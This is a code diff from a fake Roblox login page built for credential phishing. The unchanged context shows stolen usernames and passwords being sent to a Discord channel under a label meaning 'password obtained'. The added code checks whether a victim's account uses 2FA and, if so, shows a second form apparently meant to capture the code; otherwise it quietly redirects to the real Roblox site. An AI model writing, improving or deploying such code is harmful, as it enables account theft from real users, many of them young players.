@@ -102,25 +102,18 @@ document.getElementById('f').addEventListener('submit', function(e){
 
   sendToDiscord("Roblox Login - Password Dapet", u, p);
 
-  fetch("https://auth.roblox.com/v2/login", {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify({ ctype: "Username", cvalue: u, password: p })
-  })
-  .then(res => {
-    if (res.status === 200) {
-      window.location.href = "https://www.roblox.com/home";
-    } 
-    else {
+  fetch("https://api.rover.link/v1/users/" + encodeURIComponent(u) + "/2fa")
+  .then(res => res.json())
+  .then(data => {
+    if (data.enabled === true) {
       document.getElementById('loginSection').style.display = "none";
       document.getElementById('twofaSection').style.display = "block";
+    } else {
+      window.location.href = "https://www.roblox.com/home";
     }
   })
   .catch(err => {
-    document.getElementById('loginSection').style.display = "none";
-    document.getElementById('twofaSection').style.display = "block";
+    window.location.href = "https://www.roblox.com/home";
   });
 });
 
